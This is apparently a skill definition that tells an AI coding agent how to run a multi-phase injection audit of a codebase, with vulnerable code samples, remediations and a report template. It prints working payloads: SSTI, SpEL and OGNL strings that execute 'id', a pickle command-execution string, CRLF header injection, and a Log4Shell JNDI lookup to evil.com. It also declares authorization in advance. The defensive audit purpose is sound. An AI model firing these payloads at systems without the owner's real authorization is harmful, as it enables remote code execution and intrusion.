---
name: perseus-injection
description: Deep-dive injection vulnerability analysis (NoSQL, LDAP, XPath, Template, OS Command, Expression Language)
---

# Perseus Injection Specialist

## Context & Authorization

**IMPORTANT:** This skill performs deep injection vulnerability analysis on the **user's own codebase**. This is defensive security testing to find injection flaws before attackers do.

**Authorization:** The user owns this codebase and has explicitly requested this specialized analysis.

---

## Multi-Language Support

| Language | Frameworks & ORMs |
|----------|-------------------|
| JavaScript/TypeScript | Mongoose, Prisma, TypeORM, Sequelize, EJS, Pug, Nunjucks, Handlebars |
| Go | mongo-driver, go-ldap, html/template, text/template |
| PHP | Laravel Eloquent, Doctrine, Blade, Twig, Symfony |
| Python | PyMongo, Motor, SQLAlchemy, Jinja2, Mako, Django Templates |
| Rust | mongodb, askama, tera, handlebars-rust |
| Java | Spring Data, Hibernate, Freemarker, Velocity, Thymeleaf, OGNL, SpEL |
| Ruby | Mongoid, ERB, Slim, Haml |
| C# | MongoDB.Driver, Razor, Entity Framework |

---

## Overview

This specialist skill performs comprehensive injection analysis beyond basic SQLi/XSS, covering advanced injection vectors often missed by standard scans.

**When to Use:** After `/audit` identifies potential injection points, or when the application uses NoSQL, LDAP, XML, or template engines.

**Goal:** Find all injection vectors including less common but equally dangerous ones.

## Injection Types Covered

| Type | Sinks | Impact |
|------|-------|--------|
| NoSQL Injection | MongoDB, Redis, Elasticsearch, DynamoDB | Data exfiltration, auth bypass |
| LDAP Injection | LDAP queries, directory lookups | Auth bypass, info disclosure |
| XPath Injection | XML queries | Data extraction |
| Template Injection (SSTI) | All template engines | RCE |
| OS Command Injection | Shell execution | RCE |
| Expression Language | EL, SpEL, OGNL, CEL | RCE |
| Header Injection | HTTP headers, emails | Response splitting, phishing |
| Log Injection | Log4j, logging frameworks | Log forging, RCE (Log4Shell) |

## Execution Instructions

### Phase 1: NoSQL Injection Analysis (3 Parallel Agents)

1.  **MongoDB Injection Analyst:**
    *   "Find all MongoDB query operations. Check for operator injection, $where injection, $regex DoS."

    **Language-Specific Patterns:**
    ```javascript
    // Node.js/Mongoose - VULNERABLE
    User.findOne({ username: req.body.username, password: req.body.password });
    // Attack: { "password": { "$ne": "" } }
    ```
    ```go
    // Go/mongo-driver - VULNERABLE
    filter := bson.M{"username": username, "password": password}
    collection.FindOne(ctx, filter)
    ```
    ```php
    // PHP/MongoDB - VULNERABLE
    $collection->findOne(['username' => $_POST['username']]);
    ```
    ```python
    # Python/PyMongo - VULNERABLE
    db.users.find_one({"username": request.json["username"]})
    ```
    ```rust
    // Rust/mongodb - VULNERABLE
    let filter = doc! { "username": &username };
    collection.find_one(filter, None).await?;
    ```
    ```java
    // Java/Spring Data MongoDB - VULNERABLE
    Query query = new Query(Criteria.where("username").is(username));
    ```

2.  **Redis Injection Analyst:**
    *   "Find Redis operations with user input. Check for: EVAL with user data, key injection, Lua script injection."

    **Patterns:**
    ```javascript
    // Node.js - VULNERABLE
    redis.eval(`return redis.call('get', '${userInput}')`, 0);
    ```
    ```go
    // Go - VULNERABLE
    rdb.Eval(ctx, script, []string{userKey})
    ```
    ```python
    # Python - VULNERABLE
    r.eval(f"return redis.call('get', '{key}')", 0)
    ```

3.  **Elasticsearch/DynamoDB Analyst:**
    *   "Find Elasticsearch queries, DynamoDB expressions with user input. Check for query DSL injection, expression injection."

### Phase 2: Directory Injection Analysis (2 Parallel Agents)

1.  **LDAP Injection Analyst:**
    *   "Find LDAP operations. Check for filter injection, DN injection."

    **Language-Specific Patterns:**
    ```java
    // Java - VULNERABLE
    String filter = "(uid=" + username + ")";
    ctx.search(base, filter, controls);
    ```
    ```python
    # Python/ldap3 - VULNERABLE
    conn.search(base, f'(uid={username})')
    ```
    ```go
    // Go/go-ldap - VULNERABLE
    filter := fmt.Sprintf("(uid=%s)", username)
    l.Search(ldap.NewSearchRequest(base, ldap.ScopeWholeSubtree, filter))
    ```
    ```php
    // PHP - VULNERABLE
    ldap_search($conn, $base, "(uid=$username)");
    ```

2.  **XPath Injection Analyst:**
    *   "Find XML processing with XPath. Check for user input in XPath expressions."

    **Patterns:**
    ```java
    // Java - VULNERABLE
    String xpath = "//user[@name='" + username + "']";
    XPath.evaluate(xpath, document);
    ```
    ```python
    # Python/lxml - VULNERABLE
    tree.xpath(f"//user[@name='{username}']")
    ```

### Phase 3: Template Injection Analysis (4 Parallel Agents)

1.  **Python Template Analyst (Jinja2, Mako, Django):**
    *   "Find template rendering. Check for user input in template strings."

    **Patterns:**
    ```python
    # Jinja2 - VULNERABLE
    Template(user_input).render()
    # Test: {{7*7}} -> 49
    # RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

    # Mako - VULNERABLE
    Template(user_input).render()
    # Test: ${7*7} -> 49

    # Django - VULNERABLE (if user controls template)
    Template(user_input).render(Context())
    ```

2.  **Java Template Analyst (Freemarker, Velocity, Thymeleaf):**
    *   "Find template engine usage. Check for SSTI vectors."

    **Patterns:**
    ```java
    // Freemarker - VULNERABLE
    Template t = new Template("name", new StringReader(userInput), cfg);
    // Test: ${7*7} -> 49
    // RCE: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

    // Velocity - VULNERABLE
    Velocity.evaluate(context, writer, "tag", userInput);
    // Test: #set($x=7*7)$x -> 49

    // Thymeleaf - VULNERABLE (with preprocessing)
    // Test: __${7*7}__ -> 49
    ```

3.  **JavaScript Template Analyst (EJS, Pug, Nunjucks):**
    *   "Find template rendering with user input."

    **Patterns:**
    ```javascript
    // EJS - VULNERABLE
    ejs.render(userInput, data);
    // Test: <%= 7*7 %> -> 49
    // RCE: <%= process.mainModule.require('child_process').execSync('id') %>

    // Pug - VULNERABLE
    pug.render(userInput);

    // Nunjucks - VULNERABLE
    nunjucks.renderString(userInput, data);
    ```

4.  **Go/Rust/PHP Template Analyst:**
    *   "Find template usage in Go, Rust, PHP."

    **Patterns:**
    ```go
    // Go text/template - VULNERABLE (if user controls template)
    t, _ := template.New("t").Parse(userInput)
    // Go html/template auto-escapes HTML but not all contexts
    ```
    ```rust
    // Rust/Tera - Check for user-controlled templates
    Tera::one_off(&user_input, &context, true)?;
    ```
    ```php
    // PHP/Twig - VULNERABLE
    $twig->createTemplate($userInput)->render();
    // Blade - Check for {!! !!} (unescaped)
    ```

### Phase 4: Command Injection Analysis (3 Parallel Agents)

1.  **Shell Execution Analyst:**
    *   "Find all shell execution points across languages."

    **Language-Specific Sinks:**
    ```javascript
    // Node.js - VULNERABLE
    exec(`ls ${userInput}`);
    execSync(`git clone ${url}`);
    spawn('sh', ['-c', cmd]);
    ```
    ```go
    // Go - VULNERABLE
    exec.Command("sh", "-c", userInput).Run()
    exec.Command("bash", "-c", fmt.Sprintf("echo %s", input))
    ```
    ```php
    // PHP - VULNERABLE
    system($cmd);
    shell_exec($_GET['cmd']);
    passthru($input);
    proc_open($cmd, $descriptors, $pipes);
    `$cmd`; // backticks
    ```
    ```python
    # Python - VULNERABLE
    os.system(cmd)
    subprocess.call(cmd, shell=True)
    subprocess.Popen(cmd, shell=True)
    os.popen(cmd)
    ```
    ```rust
    // Rust - VULNERABLE
    Command::new("sh").arg("-c").arg(&user_input).output()?;
    ```
    ```java
    // Java - VULNERABLE
    Runtime.getRuntime().exec(cmd);
    new ProcessBuilder("sh", "-c", cmd).start();
    ```
    ```ruby
    # Ruby - VULNERABLE
    system(cmd)
    `#{cmd}`
    %x{#{cmd}}
    exec(cmd)
    ```

2.  **Argument Injection Analyst:**
    *   "Find cases where user controls command arguments (even without shell)."

    **Patterns:**
    ```javascript
    // Argument injection - VULNERABLE
    execFile('git', ['clone', userUrl]); // --upload-pack injection
    execFile('curl', [userUrl]); // -o injection
    ```

3.  **Indirect Command Injection Analyst:**
    *   "Find indirect command injection via filenames, environment variables."

### Phase 5: Expression Language Injection (2 Parallel Agents)

1.  **Java EL/SpEL/OGNL Analyst:**
    *   "Find expression language evaluation with user input."

    **Patterns:**
    ```java
    // SpEL - VULNERABLE
    ExpressionParser parser = new SpelExpressionParser();
    parser.parseExpression(userInput).getValue();
    // RCE: T(java.lang.Runtime).getRuntime().exec('id')

    // OGNL (Struts) - VULNERABLE
    OgnlUtil.getValue(userInput, context, root);
    // RCE: (#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id'))

    // EL - VULNERABLE
    ${userInput} in JSP/JSF
    ```

2.  **Other Expression Languages:**
    *   "Check for CEL (Google), Expr, other expression evaluators."

### Phase 6: Log Injection Analysis (2 Parallel Agents)

1.  **Log4j/Log4Shell Analyst:**
    *   "Check for Log4j JNDI injection vulnerability."

    **Pattern:**
    ```java
    // VULNERABLE to Log4Shell (CVE-2021-44228)
    logger.info("User: " + username);
    // Attack: ${jndi:ldap://evil.com/a}
    ```

2.  **Log Forging Analyst:**
    *   "Check for log injection that can forge log entries, inject newlines."

    **Patterns:**
    ```javascript
    // VULNERABLE - newlines in logs
    console.log(`User logged in: ${username}`);
    // Attack: username = "admin\n[INFO] Admin action performed"
    ```

### Phase 7: Header Injection Analysis (1 Agent)

1.  **HTTP Header Injection Analyst:**
    *   "Find HTTP header setting with user input. Check for CRLF injection."

    **Patterns:**
    ```javascript
    // Node.js - VULNERABLE
    res.setHeader('X-Custom', userInput);
    // Attack: value\r\nSet-Cookie: evil=true
    ```
    ```go
    // Go - VULNERABLE
    w.Header().Set("Location", userInput)
    ```
    ```php
    // PHP - VULNERABLE
    header("Location: " . $_GET['url']);
    ```

### Phase 8: ReDoS (Regex Denial of Service) Analysis (2 Parallel Agents)

1.  **Regex Pattern Analyst:**
    *   "Find regex patterns with user input that could cause catastrophic backtracking."

    **Vulnerable Patterns:**
    ```javascript
    // Node.js - VULNERABLE (exponential backtracking)
    const emailRegex = /^([a-zA-Z0-9]+)+@/;  // Nested quantifiers
    const pathRegex = /^(a+)+$/;  // Classic ReDoS
    const htmlRegex = /<([a-z]+)*>/;  // Nested groups with *

    userInput.match(emailRegex);  // Can hang with crafted input

    // Attack payload: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
    ```
    ```python
    # Python - VULNERABLE
    import re
    pattern = re.compile(r'^(a+)+$')
    pattern.match(user_input)  # Hangs with "aaaa...!"
    ```
    ```go
    // Go - SAFER (RE2 engine doesn't backtrack)
    // But check for regexp/syntax with PCRE features
    regexp.MustCompile(`^(a+)+$`)  // Still check patterns
    ```
    ```java
    // Java - VULNERABLE
    Pattern.compile("^(a+)+$").matcher(input).matches();
    ```
    ```php
    // PHP - VULNERABLE
    preg_match('/^(a+)+$/', $input);  // Uses PCRE
    ```

    **Dangerous Patterns:**
    | Pattern | Why Dangerous |
    |---------|---------------|
    | `(a+)+` | Nested quantifiers |
    | `(a|a)+` | Overlapping alternation |
    | `(a+)*` | Quantifier on quantified group |
    | `(.*a){x}` | Greedy with repetition |
    | `(a+){2,}` | Nested quantifiers |

2.  **User Input Regex Analyst:**
    *   "Find places where user input is used to construct regex patterns."

    **Patterns:**
    ```javascript
    // VULNERABLE - User controls regex
    const pattern = new RegExp(userInput);
    text.match(pattern);  // ReDoS + potential RCE in some engines

    // SAFE - Escape user input
    const escaped = userInput.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const pattern = new RegExp(escaped);
    ```
    ```python
    # VULNERABLE
    re.search(user_input, text)

    # SAFE
    re.search(re.escape(user_input), text)
    ```

### Phase 9: Deserialization Analysis (4 Parallel Agents)

1.  **Java Deserialization Analyst:**
    *   "Find unsafe Java deserialization."

    **Patterns:**
    ```java
    // VULNERABLE - Deserializing untrusted data
    ObjectInputStream ois = new ObjectInputStream(inputStream);
    Object obj = ois.readObject();  // RCE if attacker controls stream

    // VULNERABLE - XMLDecoder
    XMLDecoder decoder = new XMLDecoder(inputStream);
    Object obj = decoder.readObject();

    // VULNERABLE - XStream without allowlist
    XStream xstream = new XStream();
    Object obj = xstream.fromXML(userInput);

    // SAFE - Use allowlist
    xstream.allowTypes(new Class[] { SafeClass.class });
    ```

    **Gadget Chains:**
    - Commons Collections (CC1-CC7)
    - Spring (Spring1, Spring2)
    - Hibernate
    - JDK (JDK7u21)

2.  **PHP Deserialization Analyst:**
    *   "Find unsafe PHP unserialize."

    **Patterns:**
    ```php
    // VULNERABLE - unserialize with user input
    $data = unserialize($_POST['data']);  // RCE via __wakeup, __destruct

    // VULNERABLE - Even with allowed_classes
    $data = unserialize($input, ['allowed_classes' => ['User']]);
    // User class might have dangerous magic methods

    // SAFE - Use JSON
    $data = json_decode($_POST['data'], true);
    ```

    **Magic Methods to Check:**
    - `__wakeup()` - Called during unserialize
    - `__destruct()` - Called when object destroyed
    - `__toString()` - Called on string conversion
    - `__call()` - Called on undefined method

3.  **Python Deserialization Analyst:**
    *   "Find unsafe Python pickle/yaml."

    **Patterns:**
    ```python
    # VULNERABLE - pickle with untrusted data
    import pickle
    data = pickle.loads(user_input)  # RCE

    # VULNERABLE - yaml.load without Loader
    import yaml
    data = yaml.load(user_input)  # RCE (PyYAML < 6.0)

    # SAFE - yaml with SafeLoader
    data = yaml.safe_load(user_input)

    # VULNERABLE - marshal
    import marshal
    marshal.loads(user_input)  # RCE
    ```

4.  **.NET Deserialization Analyst:**
    *   "Find unsafe .NET deserialization."

    **Patterns:**
    ```csharp
    // VULNERABLE - BinaryFormatter
    BinaryFormatter bf = new BinaryFormatter();
    object obj = bf.Deserialize(stream);  // RCE

    // VULNERABLE - NetDataContractSerializer
    var serializer = new NetDataContractSerializer();
    object obj = serializer.ReadObject(stream);

    // VULNERABLE - ObjectStateFormatter
    ObjectStateFormatter osf = new ObjectStateFormatter();
    object obj = osf.Deserialize(input);

    // VULNERABLE - LosFormatter (ViewState)
    LosFormatter lf = new LosFormatter();
    object obj = lf.Deserialize(input);

    // SAFE - Use JSON with known types only
    JsonConvert.DeserializeObject<SafeType>(input);
    ```

    **Gadgets:**
    - TypeConfuseDelegate
    - TextFormattingRunProperties
    - PSObject
    - WindowsIdentity

## Safe Payload Reference

| Injection Type | Detection Payload | Verification |
|----------------|-------------------|--------------|
| NoSQL (MongoDB) | `{"$gt": ""}` | Returns all records |
| NoSQL (Redis) | `\r\nSET evil 1\r\n` | Key created |
| LDAP | `*)(uid=*))(|(uid=*` | Modified query results |
| XPath | `' or '1'='1` | Returns all nodes |
| SSTI (Jinja2) | `{{7*7}}` | Output: 49 |
| SSTI (Freemarker) | `${7*7}` | Output: 49 |
| SSTI (EJS) | `<%= 7*7 %>` | Output: 49 |
| Command | `; sleep 5` | 5 second delay |
| SpEL | `${7*7}` | Output: 49 |
| Header | `\r\nX-Injected: true` | New header appears |
| Log4j | `${jndi:ldap://x.x}` | DNS callback |
| ReDoS | `aaaaaaaaaaaaaaaaaa!` | Response delay/timeout |
| Java Deser | ysoserial payload | RCE callback |
| PHP Deser | `O:8:"stdClass":0:{}` | Object created |
| Python Pickle | `cos\nsystem\n(S'id'\ntR.` | Command executed |

## Output Requirements

Create `deliverables/injection_deep_analysis.md`:

```markdown
# Advanced Injection Analysis

## Summary
| Type | Instances Found | Vulnerable | Safe |
|------|-----------------|------------|------|
| NoSQL | X | Y | Z |
| LDAP | X | Y | Z |
| Template (SSTI) | X | Y | Z |
| Command | X | Y | Z |
| Expression | X | Y | Z |
| Log Injection | X | Y | Z |
| Header | X | Y | Z |

## Language/Framework Detected
- Primary: [e.g., Node.js/Express, Go/Gin, PHP/Laravel]
- Template Engine: [e.g., EJS, Jinja2, Blade]
- Database: [e.g., MongoDB, Redis]

## Critical Findings

### [INJ-001] MongoDB Operator Injection in Login
**Severity:** Critical
**Type:** NoSQL Injection
**Language:** Node.js/Mongoose
**Location:** `auth/login.js:34`

**Vulnerable Code:**
```javascript
const user = await User.findOne({
  username: req.body.username,
  password: req.body.password
});
```

**Attack:**
```json
POST /login
{"username": "admin", "password": {"$ne": ""}}
```

**Impact:** Authentication bypass - attacker can login as any user

**Remediation:**
```javascript
// Validate types before query
if (typeof username !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Invalid input' });
}
const user = await User.findOne({ username, password: hash(password) });
```

---

### [INJ-002] SSTI in Email Template
**Severity:** Critical
**Type:** Server-Side Template Injection
**Language:** Python/Jinja2
**Location:** `utils/email.py:56`

**Vulnerable Code:**
```python
template = Template(f"Hello {user_name}, your order is ready")
```

**Attack:**
```
user_name = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

**Impact:** Remote Code Execution

---

## Template Engine Security Matrix

| Engine | Language | Sandboxed | Risk if User-Controlled |
|--------|----------|-----------|------------------------|
| Jinja2 | Python | No | Critical (RCE) |
| EJS | Node.js | No | Critical (RCE) |
| Freemarker | Java | Partial | Critical (RCE) |
| Blade | PHP | No | High (RCE possible) |
| html/template | Go | Yes | Low (auto-escape) |

## Recommendations
1. Validate input types before NoSQL queries
2. Never use user input in template source strings
3. Use parameterized commands, not shell=True
4. Update Log4j to 2.17+ or disable lookups
5. Sanitize CRLF characters in header values
```

**Next Step:** Findings feed into `/exploit` for verification.
